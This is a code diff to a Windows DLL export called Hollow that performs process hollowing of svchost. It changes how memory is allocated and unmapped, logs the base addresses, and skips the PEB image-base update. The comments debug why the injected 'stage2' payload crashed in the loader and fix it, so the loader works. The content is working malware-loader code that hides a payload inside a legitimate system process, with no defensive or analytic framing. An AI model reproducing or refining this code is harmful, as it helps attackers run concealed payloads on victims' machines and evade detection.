@@ -260,16 +260,35 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     DWORD imageSize = ntH->OptionalHeader.SizeOfImage;
     LPVOID targetBase = (LPVOID)ntH->OptionalHeader.ImageBase;
 
-    pNtUnmap(pi.hProcess, imageBase);
-
+    // ponytail: do NOT unconditionally NtUnmapViewOfSection. Unmapping
+    // svchost's original image leaves a dangling entry in the hollowed
+    // process's PEB_LDR_DATA module list; the next LdrLoadDll (via
+    // LoadLibraryW in stage2's LoadDeps) walks the list, dereferences the
+    // freed region, and access-violates before stage2 can log anything.
+    // Our log shows this exactly: IAT resolved, threads resumed, "Hollow
+    // () complete", then ZERO stage2 lines — the loader crash is silent.
+    //
+    // Instead: try VirtualAllocEx at stage2's preferred base first. Only
+    // unmap the original if that address is actually occupied (targetBase
+    // == imageBase, rare with --no-dynamicbase). When VirtualAllocEx at
+    // targetBase succeeds without unmap, svchost's image stays mapped but
+    // unused — the PEB loader list remains consistent and LoadLibraryW
+    // works normally. Ceiling: if a targetBase collision AND the loader
+    // crash recurred simultaneously, would need to also walk the LDR list
+    // and clear svchost's entry before LoadDeps() runs.
     LPVOID remoteImage = VirtualAllocEx(pi.hProcess, targetBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteImage) {
-        LogMessage(L"[-] VirtualAllocEx at preferred base failed — trying any address");
-        remoteImage = VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        LogMessage(L"[*] preferred base busy — unmapping original then retrying");
+        pNtUnmap(pi.hProcess, imageBase);
+        remoteImage = VirtualAllocEx(pi.hProcess, targetBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!remoteImage) {
-            LogMessage(L"[-] VirtualAllocEx (any addr) also failed");
-            LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
-            return;
+            LogMessage(L"[-] VirtualAllocEx at preferred base failed — trying any address");
+            remoteImage = VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (!remoteImage) {
+                LogMessage(L"[-] VirtualAllocEx (any addr) also failed");
+                LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+                return;
+            }
         }
     }
 
@@ -286,7 +305,7 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     {
         wchar_t dbg[256];
         DWORD_PTR _delta = (DWORD_PTR)remoteImage - (DWORD_PTR)targetBase;
-        wsprintfW(dbg, L"[*] delta=0x%Ix, remoteImage=%p, targetBase=%p, imageSize=%lu", _delta, remoteImage, targetBase, imageSize);
+        wsprintfW(dbg, L"[*] delta=0x%Ix, remoteImage=%p, targetBase=%p, imageBase(orig svchost)=%p, imageSize=%lu", _delta, remoteImage, targetBase, imageBase, imageSize);
         LogMessage(dbg);
     }
 
@@ -303,7 +322,13 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
         LogMessage(L"[*] delta==0, skipping ApplyRelocations");
     }
 
-    if (remoteImage != targetBase) {
+    // ponytail: keep PEB.ImageBaseAddress pointing at the (still-mapped,
+    // now-unused) original svchost image. The OS doesn't read PEB.ImageBase
+    // to validate "running" code; only the loader list matters for
+    // LoadLibraryW, and that list is intact because we no longer unmap.
+    // Updating it to remoteImage would lie to the OS about which image is
+    // "the process exe" with no benefit. Skip in all cases.
+    if (0 && remoteImage != targetBase) {
         LogMessage(L"[*] updating PEB image base");
         WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + sizeof(PVOID) * 2, &remoteImage, sizeof(PVOID), NULL);
     } else {
